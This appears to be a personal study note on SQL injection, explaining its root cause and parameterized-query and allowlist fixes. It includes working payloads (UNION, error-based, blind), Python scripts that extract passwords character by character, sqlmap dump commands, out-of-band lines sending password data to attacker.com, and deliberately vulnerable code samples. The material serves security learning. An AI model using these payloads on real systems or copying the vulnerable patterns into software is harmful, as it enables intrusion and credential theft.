# SQL Injection
Tags: #vulnerability #injection #database #day1

## Understand the Feature First

SQL injection abuses the way web applications talk to databases. Every dynamic web app needs to store and retrieve data — users, products, orders, sessions. The developer writes SQL queries to ask the database questions, and the answers get rendered into HTML pages.

The flow for every database-backed web feature:

```
Browser sends HTTP request (e.g., GET /search?q=shoes)
    → Web server routes to handler function
        → Handler reads user input from the request
            → Handler builds a SQL string using that input
                → SQL string sent to database over TCP/Unix socket
                    → Database parses SQL, executes query, returns rows
                        → Handler formats rows into HTML response
```

At the **protocol level**, the application sends a literal text string to the database. In Wireshark you'd see a MySQL `COM_QUERY` packet containing something like:

```sql
SELECT name, price FROM products WHERE name LIKE '%shoes%'
```

The developer needs to get user input into that SQL string somehow. The most intuitive way — and the way most tutorials teach — is **string concatenation**. This is what makes SQLi possible.

## Why It Exists (Root Cause)

The root cause is **confusion of code and data in the same channel**. SQL queries are strings that mix two things:

1. **Structure** — the SQL keywords, operators, and grammar (`SELECT`, `FROM`, `WHERE`, `LIKE`)
2. **Data** — the values being searched/compared (`shoes`)

When a developer concatenates user input into a SQL string, the database parser receives one string and must figure out which parts are structure and which are data. It cannot — because they were mixed together before the parser ever saw them.

The attacker provides input containing SQL syntax. The parser interprets it as **code** (SQL keywords and structure) instead of **data** (a value to compare). The attacker has changed the grammatical structure of the query.

**Why developers write it this way:**
- SQL is a string-based language sent over a wire — concatenation feels natural
- Framework raw APIs *allow* string concatenation — it's the path of least resistance
- It works perfectly in development with normal input — the bug is invisible until adversarial input arrives
- Stack Overflow and tutorials often show concatenation first

**Why sanitization (blocklisting) is not a real fix:**
- You need to know every character/sequence with syntactic meaning in SQL
- Across every database engine (MySQL, PostgreSQL, MSSQL, Oracle — all parse differently)
- Accounting for every encoding (UTF-8, URL encoding, double encoding, Unicode)
- You're essentially writing your own SQL parser to defeat the real SQL parser
- The attacker only needs one gap you missed

Examples of sanitization failing:

```python
# "Escape single quotes" — fails on MySQL with GBK charset (CVE-2006-2753)
def sanitize(input):
    return input.replace("'", "''")
# 0xbf27 → the 0xbf eats the escape, the 0x27 (') survives

# "Block SQL keywords" — attacker nests them
def sanitize(input):
    blacklist = ['UNION', 'SELECT', 'DROP', '--']
    for word in blacklist:
        input = input.replace(word, '')
    return input
# Input: UNUNIONION SELSELECTECT → strips inner keywords → UNION SELECT
```

**The architectural fix:** [[Parameterized Queries]] — separate the code channel from the data channel at the database protocol level so the parser never has the chance to interpret data as code. (See "What the Developer Should Have Done" below.)

## The Data Flow

**Normal request:**

```
Source:  request.args.get('q') returns "shoes"
    ↓
Processing:  f-string builds "SELECT name, price FROM products WHERE name LIKE '%shoes%'"
    ↓
Sink:  cursor.execute() sends string to MySQL
    ↓
MySQL parser: SELECT(keyword) name(column) ... LIKE '%shoes%'(string_literal)
    → Executes as intended
```

**Malicious request:**

```
Source:  request.args.get('q') returns "' UNION SELECT username,password FROM users--"
    ↓
Processing:  f-string builds "SELECT name, price FROM products WHERE name LIKE '%' UNION SELECT username,password FROM users--%'"
    ↓
Sink:  cursor.execute() sends string to MySQL
    ↓
MySQL parser:
    Statement 1: SELECT name, price FROM products WHERE name LIKE '%'
    UNION
    Statement 2: SELECT username, password FROM users
    Comment: --%'  (everything after -- is ignored)
    → Attacker's query executes, data exfiltrated through the application's own rendering
```

## What the Developer Should Have Done

**Parameterized queries (prepared statements)** — the only architecturally correct fix. This works at the database protocol level:

```
── WITHOUT prepared statements ──
App → MySQL:  COM_QUERY "SELECT name FROM products WHERE name LIKE '%shoes%'"
               ↑ one packet, code and data mixed

── WITH prepared statements ──
Step 1 — PREPARE:
App → MySQL:  COM_STMT_PREPARE "SELECT name FROM products WHERE name LIKE ?"
MySQL → App:  OK (statement_id=1, 1 parameter expected)

Step 2 — EXECUTE:
App → MySQL:  COM_STMT_EXECUTE statement_id=1, param1="shoes"
               ↑ data sent in BINARY format, in a separate field
               MySQL NEVER PARSES this value as SQL
```

The SQL structure is parsed **once** during PREPARE. By the time user data arrives in EXECUTE, the parser is done. The query plan is built. The database treats the parameter as **only a value** — never as syntax. Even `' UNION SELECT password FROM users--` is treated as a literal string to compare against.

**Parameterized queries in every language:**

```python
# Python
cursor.execute("SELECT name, price FROM products WHERE name LIKE %s",
               ('%' + query + '%',))
```

```java
// Java
PreparedStatement ps = conn.prepareStatement(
    "SELECT name, price FROM products WHERE name LIKE ?");
ps.setString(1, "%" + query + "%");
```

```javascript
// Node.js
const [rows] = await pool.execute(
    'SELECT name, price FROM products WHERE name LIKE ?',
    [`%${query}%`]
);
```

```php
// PHP PDO
$stmt = $pdo->prepare("SELECT name, price FROM products WHERE name LIKE ?");
$stmt->execute(['%' . $query . '%']);
```

**Where parameterization can't reach — use allowlisting:**

You cannot parameterize SQL **structure** — table names, column names, `ORDER BY` directions, operators. The parser needs these during the PREPARE step. When these must come from user input, use allowlisting:

```python
# ORDER BY — a sortable table needs dynamic column sorting
ALLOWED_SORT = {'name', 'price', 'created_at'}
ALLOWED_DIR = {'asc', 'desc'}

sort = request.args.get('sort', 'name')
direction = request.args.get('dir', 'asc')

# If input isn't in the allowed set, replace with a safe default
if sort not in ALLOWED_SORT:
    sort = 'name'
if direction.lower() not in ALLOWED_DIR:
    direction = 'asc'

# Now safe — the value is guaranteed to be one of your known-good strings
cursor.execute(f"SELECT name, price FROM products ORDER BY {sort} {direction}")
```

The attacker can send anything — `(SELECT password FROM users LIMIT 1)`, `DROP TABLE users--` — it all gets replaced with `'name'`. You're not detecting bad input, you're **ignoring everything except known-good values**.

**The mental model:**
- Sanitization (blocklist) = "let me clean this and hope I caught everything" → **will fail**
- Parameterized queries = "the parser literally cannot see user data as code" → **architectural guarantee**
- Allowlisting = "only these exact values are permitted" → **for structural elements parameterization can't reach**

This same pattern (separate code from data, never blocklist) applies across all injection classes: [[XSS]], [[Command Injection]], [[LDAP Injection]], [[Template Injection]].

## Exploitation

### Determining the injection context

Before choosing a technique, determine:

1. **Injection context** — is the input inside a string literal (`WHERE name = '{input}'`) or numeric context (`WHERE id = {input}`)? String context requires a `'` to break out first.
2. **What you can observe** — do you see query output? Error messages? Page differences? Only response timing?

Decision tree:

```
Can you see query results on the page?
├── YES → UNION-based
└── NO
    ├── Are database errors displayed?
    │   └── YES → Error-based
    └── NO
        ├── Does the page differ based on true/false conditions?
        │   └── YES → Boolean-based blind
        └── NO
            ├── Can you measure response time differences?
            │   └── YES → Time-based blind
            └── Can the DB make outbound connections?
                └── YES → Out-of-band (DNS/HTTP exfil)
```

### UNION-Based — Data reflected on page

Combine your query with the original using `UNION`. Both SELECTs must return the same column count.

**Step 1 — Find column count:**

```http
GET /user?id=1 ORDER BY 1--    → OK (column 1 exists)
GET /user?id=1 ORDER BY 2--    → OK (column 2 exists)
GET /user?id=1 ORDER BY 3--    → Error (column 3 doesn't exist) → 2 columns
```

Or:

```http
GET /user?id=1 UNION SELECT NULL,NULL--    → works → 2 columns
```

**Step 2 — Find which columns display on the page:**

```http
GET /user?id=-1 UNION SELECT 'AAAA','BBBB'--
```

`id=-1` ensures the first query returns nothing so only the UNION result renders. Page shows `AAAA` and `BBBB` — both columns reflected.

**Step 3 — Enumerate the schema via `information_schema`:**

```http
# List tables
GET /user?id=-1 UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

# List columns for a table
GET /user?id=-1 UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='admin_users'--
```

`information_schema` is a built-in database (MySQL, PostgreSQL, MSSQL) containing metadata about every table, column, and privilege. It's the attacker's map.

**Step 4 — Extract data:**

```http
GET /user?id=-1 UNION SELECT username,password FROM admin_users LIMIT 1--
```

### Error-Based — Verbose errors displayed

Force the database to embed extracted data inside an error message.

```http
# MySQL — EXTRACTVALUE XML error
GET /user?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM admin_users LIMIT 1)))--
# Error: XPATH syntax error: '~$2b$12$LJ3m4ys...'

# PostgreSQL — type casting error
GET /user?id=1 AND 1=CAST((SELECT password FROM admin_users LIMIT 1) AS int)--
# Error: invalid input syntax for integer: "$2b$12$LJ3m4ys..."
```

The `0x7e` is `~`, used as a marker to find your data in the error string.

### Boolean-Based Blind — Page differs on true/false

No data output, no errors, but the page looks different depending on whether the query returns results.

Ask yes/no questions, one character at a time:

```http
# Is the first character of the admin password 'a'?
GET /user?id=1 AND (SELECT SUBSTRING(password,1,1) FROM admin_users LIMIT 1)='a'--

# True → page shows user (200) | False → page shows "not found" (404)
```

**Binary search optimization** — instead of trying every character (36+ requests), bisect the ASCII range:

```http
GET /user?id=1 AND ASCII(SUBSTRING((SELECT password FROM admin_users LIMIT 1),1,1))>109--
# True → character is between 110-127
# False → character is between 0-109
# 7 requests per character instead of 36
```

Automation script:

```python
import requests

extracted = ""
for position in range(1, 50):
    for char in 'abcdefghijklmnopqrstuvwxyz0123456789!@#$%':
        payload = f"1 AND (SELECT SUBSTRING(password,{position},1) FROM admin_users LIMIT 1)='{char}'"
        r = requests.get(f"http://target/user?id={payload}")
        if r.status_code == 200:
            extracted += char
            print(f"[+] Position {position}: {char}  →  {extracted}")
            break
```

### Time-Based Blind — No visible page difference

Page looks identical regardless of query result. Use conditional time delays.

```http
# MySQL
GET /search?q=test' AND IF((SELECT SUBSTRING(password,1,1) FROM admin_users LIMIT 1)='a', SLEEP(3), 0)--

# Response in ~50ms → not 'a'
# Response in ~3050ms → IS 'a'
```

```python
import requests, time

extracted = ""
for position in range(1, 50):
    for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
        payload = f"test' AND IF((SELECT SUBSTRING(password,{position},1) FROM admin_users LIMIT 1)='{char}', SLEEP(3), 0)--"
        start = time.time()
        requests.get(f"http://target/search?q={payload}")
        elapsed = time.time() - start
        if elapsed > 2.5:
            extracted += char
            print(f"[+] Position {position}: {char}  →  {extracted}")
            break
```

Noisiest and slowest technique. Network jitter can cause false positives. But when it's your only option, it works.

### Out-of-Band (OOB) — Database makes external connections

Make the database send data to a server you control:

```sql
-- MySQL (Windows): LOAD_FILE triggers DNS lookup
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM admin_users LIMIT 1), '.attacker.com\\share'));

-- MSSQL: xp_dirtree triggers DNS lookup
EXEC master..xp_dirtree '\\' + (SELECT TOP 1 password FROM admin_users) + '.attacker.com\share';

-- Oracle: UTL_HTTP makes an HTTP request
SELECT UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT password FROM admin_users WHERE ROWNUM=1)) FROM dual;
```

The extracted data appears in the DNS subdomain or HTTP path. Catch with Burp Collaborator or `interactsh`. Fast (one request per value) but requires outbound network access from the DB server.

### Second-Order SQLi

Injection and execution happen at **different times, in different code paths**.

```python
# STEP 1: Registration — parameterized insert, stores payload safely
@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    cursor.execute("INSERT INTO users (username, password) VALUES (%s, %s)",
                   (username, hashed_password))  # Safe

# STEP 2: Password change — reads stored value, concatenates unsafely
@app.route('/change-password', methods=['POST'])
def change_password():
    username = get_current_user_from_session()  # Reads "admin'--" from DB
    cursor.execute(f"UPDATE users SET password = %s WHERE username = '{username}'")
```

Attacker registers as `admin'--`. Later, when they change their password, the query becomes:

```sql
UPDATE users SET password = 'new_hash' WHERE username = 'admin'--'
```

Updates the **admin** account's password. The dangerous assumption: "data from our own database is safe." It's not — if a user put it there, it's still user input.

Extremely hard to find in testing because injection point (registration) and trigger (password change) are in different features. Automated scanners usually miss this.

### Time-Blind Enumeration Sequence

For any blind technique, you must enumerate layer by layer — each step requires information from the previous one:

```
Step 0: Identify the database type
   SLEEP(3) works → MySQL | pg_sleep(3) → PostgreSQL | WAITFOR DELAY → MSSQL

Step 1: Database name
   IF(LENGTH(database())=5, SLEEP(3), 0) → name is 5 chars
   IF(SUBSTRING(database(),1,1)='s', SLEEP(3), 0) → first char is 's'
   → "store"

Step 2: Table names (via information_schema)
   IF(SUBSTRING((SELECT table_name FROM information_schema.tables
     WHERE table_schema='store' LIMIT 0,1),1,1)='u', SLEEP(3), 0)
   → "users", "products", "orders"...

Step 3: Column names
   IF(SUBSTRING((SELECT column_name FROM information_schema.columns
     WHERE table_name='users' LIMIT 0,1),1,1)='i', SLEEP(3), 0)
   → "id", "username", "email", "password", "role"...

Step 4: Extract data
   IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='$', SLEEP(3), 0)
   → "$2b$12$LJ3..."
```

`sqlmap` automates this entire chain:

```bash
sqlmap -u "http://target/search?q=test" --technique=T --time-sec=3 --dbs
sqlmap -u "http://target/search?q=test" --technique=T -D store --tables
sqlmap -u "http://target/search?q=test" --technique=T -D store -T users --columns
sqlmap -u "http://target/search?q=test" --technique=T -D store -T users -C username,password --dump
```

## What the Vulnerable Code Looks Like

### Python/Flask

```python
@app.route('/search')
def search():
    query = request.args.get('q')
    cursor.execute(f"SELECT name, price FROM products WHERE name LIKE '%{query}%'")
    results = cursor.fetchall()
    return render_template('results.html', products=results)
```

### Java/Spring

```java
@GetMapping("/search")
public List<Product> search(@RequestParam String q) {
    String sql = "SELECT name, price FROM products WHERE name LIKE '%" + q + "%'";
    return jdbcTemplate.query(sql, new ProductRowMapper());
}
```

### Node/Express

```javascript
app.get('/search', async (req, res) => {
    const query = req.query.q;
    const sql = `SELECT name, price FROM products WHERE name LIKE '%${query}%'`;
    const [rows] = await pool.execute(sql);
    res.json(rows);
});
```

### PHP

```php
$query = $_GET['q'];
$sql = "SELECT name, price FROM products WHERE name LIKE '%$query%'";
$result = mysqli_query($conn, $sql);
```

### ORM Escape Hatches (Looks Safe, Isn't)

ORMs (Object-Relational Mappers) like Django ORM, SQLAlchemy, and Sequelize map Python/JS objects to database tables so developers write application code instead of SQL. They generate parameterized queries under the hood — safe by default. But every ORM has raw SQL escape hatches for complex queries the ORM can't express, and this is where SQLi returns:

```python
# Django — raw() with concatenation
User.objects.raw(f"SELECT * FROM users WHERE email = '{user_input}'")

# Django — .extra() with concatenation
User.objects.extra(where=[f"email LIKE '%{user_input}%'"])

# SQLAlchemy — text() with f-string
session.execute(text(f"SELECT * FROM users WHERE email = '{user_input}'"))
```

### Dynamic Structural Elements

```python
# ORDER BY — sortable tables where column/direction come from user input
sort = request.args.get('sort', 'name')
direction = request.args.get('dir', 'asc')
sql = f"SELECT name, price FROM products ORDER BY {sort} {direction}"
cursor.execute(sql)
# Attacker sends sort=(SELECT password FROM users LIMIT 1)&dir=--
# Leaks data through sort-order observation (boolean inference)

# Search builders — column and operator from user input
for f in filters:
    column = f['column']      # FROM USER INPUT
    operator = f['operator']  # FROM USER INPUT
    value = f['value']
    sql += f" AND {column} {operator} %s"  # column & operator concatenated
    params.append(value)                     # only value parameterized

# Stored procedures with dynamic SQL inside
CREATE PROCEDURE SearchProducts(IN search_term VARCHAR(255))
BEGIN
    SET @sql = CONCAT('SELECT * FROM products WHERE name LIKE ''%', search_term, '%''');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
END;
# Injection moved from app layer to database layer — same string concatenation
```

## What the Fix Looks Like

**1. Parameterized queries for data values (primary fix):**

```python
# Python
cursor.execute("SELECT name, price FROM products WHERE name LIKE %s",
               ('%' + query + '%',))

# IMPORTANT: cursor.execute("... %s" % var) is STRING FORMATTING (vulnerable)
#            cursor.execute("... %s", (var,))  is PARAMETERIZED BINDING (safe)
# The comma-separated tuple is the difference
```

```java
// Java
PreparedStatement ps = conn.prepareStatement(
    "SELECT name, price FROM products WHERE name LIKE ?");
ps.setString(1, "%" + query + "%");
```

```javascript
// Node.js
const [rows] = await pool.execute(
    'SELECT name, price FROM products WHERE name LIKE ?',
    [`%${query}%`]
);
```

```php
// PHP PDO
$stmt = $pdo->prepare("SELECT name, price FROM products WHERE name LIKE ?");
$stmt->execute(['%' . $query . '%']);
```

**2. Allowlisting for structural elements:**

```python
ALLOWED_SORT = {'name', 'price', 'created_at'}
ALLOWED_DIR = {'asc', 'desc'}
ALLOWED_COLUMNS = {'email', 'role', 'created_at'}
ALLOWED_OPERATORS = {'=', 'LIKE', '>', '<'}

if sort not in ALLOWED_SORT:
    sort = 'name'
if direction.lower() not in ALLOWED_DIR:
    direction = 'asc'
if column not in ALLOWED_COLUMNS or operator not in ALLOWED_OPERATORS:
    continue  # skip invalid filter
```

**3. ORM raw query escape hatches — still parameterize:**

```python
# Django — safe raw query
User.objects.raw("SELECT * FROM users WHERE email = %s", [user_input])

# SQLAlchemy — safe text() with bind parameters
session.execute(text("SELECT * FROM users WHERE email = :email"), {"email": user_input})
```

## Chains With

- [[XSS]] — SQLi extracts stored XSS payloads or injects them into database fields that render in other users' pages
- [[Command Injection]] — some databases allow OS command execution (MSSQL `xp_cmdshell`, PostgreSQL `COPY TO PROGRAM`)
- [[File Read/Write]] — MySQL `LOAD_FILE()` reads server files, `INTO OUTFILE` writes files (webshells)
- [[SSRF]] — database outbound connections (Oracle `UTL_HTTP`, MSSQL `xp_dirtree`) can reach internal services
- [[Authentication Bypass]] — SQLi in login forms can bypass authentication entirely (`' OR 1=1--`)
- [[Privilege Escalation]] — second-order SQLi in password change flows can modify other users' credentials

## Key Q&A From This Session

**Q: If the fundamental problem is that user data and SQL code share the same string, what would a solution need to guarantee?**
A: The solution needs to **separate the code channel from the data channel** so the parser never has the opportunity to interpret data as code. Parameterized queries achieve this at the protocol level — the SQL structure is sent and parsed in one step (PREPARE), then data values are bound in a separate step (EXECUTE) where the parser is already done. The data is transmitted in binary format in a separate protocol field, never touching the SQL parser.

**Q: Why does SQL injection still exist if prepared statements solve it?**
A: Because there are scenarios where parameterization can't reach:
- **ORDER BY column/direction** — can't parameterize identifiers, need allowlisting
- **Dynamic table/column names** — parser needs these during PREPARE, need allowlisting
- **ORM raw queries** — developers bypass ORM safety for complex queries and forget to parameterize
- **Search/filter builders** — structural elements (column names, operators) come from user input
- **Stored procedures** — dynamic SQL inside the procedure does the same string concatenation
- **Second-order** — developers trust data from their own database, concatenate it into queries
- **Legacy code** — nobody rewrote it

**Q: What's an ORM and why does it matter for SQLi?**
A: An ORM (Object-Relational Mapper) bridges the gap between application objects (a User with email, name, role) and database rows (SQL statements, result sets). You define your objects once, and the ORM generates parameterized SQL under the hood. This makes the safe path the default — you write `User.objects.filter(role="admin")` instead of raw SQL. SQLi re-enters through ORM **escape hatches**: `.raw()`, `.extra()`, `text()`, `knex.raw()` — functions that let developers write raw SQL for complex queries the ORM can't express. The moment they use string formatting in those escape hatches, they've bypassed all ORM safety.

**Q: How does ORDER BY injection leak data through boolean inference?**
A: When a developer concatenates user input into `ORDER BY`, the attacker can inject a `CASE` expression that sorts results differently based on a yes/no condition:
```sql
ORDER BY (CASE
    WHEN (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'
    THEN price    -- sort by price if true
    ELSE name     -- sort by name if false
END)
```
The attacker observes whether products appear sorted by price or by name. Price order → the character is 'a'. Name order → try 'b'. Repeat for every character position. The sort order becomes a one-bit information leak channel.

## Lab Work

- PortSwigger Web Security Academy — SQL injection labs (all levels)
- PortSwigger — UNION attack labs
- PortSwigger — Blind SQL injection labs (boolean and time-based)
- HackTheBox — CWEE SQL injection module
- sqlmap practice against DVWA or WebGoat for understanding automation

## Key Insights

- **SQLi is a parsing confusion problem**, not a "missing validation" problem. The database parser can't distinguish developer SQL from attacker SQL because they arrive as one string.
- **Sanitization (blocklisting) always fails** — you're trying to enumerate everything bad, the attacker only needs one thing you missed. Nested keywords (`UNUNIONION`), encoding bypasses (GBK charset), MySQL version comments (`/*!50000UNION*/`) all defeat blocklists.
- **The fix pattern is universal across injection classes**: separate code from data so confusion is structurally impossible. Parameterized queries for SQLi, context-aware output encoding for XSS, exec arrays for command injection — same principle.
- **Modern SQLi lives in the gaps** where parameterization can't reach: ORDER BY, dynamic column names, ORM escape hatches, search builders, stored procedures, and second-order flows.
- **"Data from our own database is safe" is a dangerous assumption** — second-order SQLi exploits exactly this trust, and it's nearly invisible to automated scanners.
- **WAFs are speed bumps, not walls** — they use blocklists (same fundamental weakness as sanitization) and parse HTTP, not SQL. The gap between the WAF's parser and the database's parser is where bypasses live.
- **In Python, `cursor.execute("... %s" % var)` vs `cursor.execute("... %s", (var,))` look almost identical** — the first is string formatting (vulnerable), the second is parameterized binding (safe). The comma-separated tuple is the difference.

## Questions That Came Up

- How does SQLi chain into file read/write and RCE in detail? (MySQL `LOAD_FILE`, `INTO OUTFILE`, MSSQL `xp_cmdshell`, PostgreSQL `COPY TO PROGRAM`)
- What does SQLi look like at the network level in Burp/Wireshark? How do the HTTP request/response differ?
- How do different database engines (PostgreSQL, MSSQL, Oracle) differ in their injection syntax and capabilities?
- Deeper exploration of second-order SQLi detection in large codebases
- How do modern frameworks (Next.js, FastAPI, Spring Boot) handle parameterization by default?

## Links

- [[Database Queries]] — how web apps interact with databases (how-it-works)
- [[Auditing SQL Injection]] — systematic testing methodology
- [[XSS]] — chains with SQLi for stored payload injection
- [[Command Injection]] — chains via database OS command execution
- [[WAF Bypass Techniques]] — evasion methods covered in this session

## My Notes
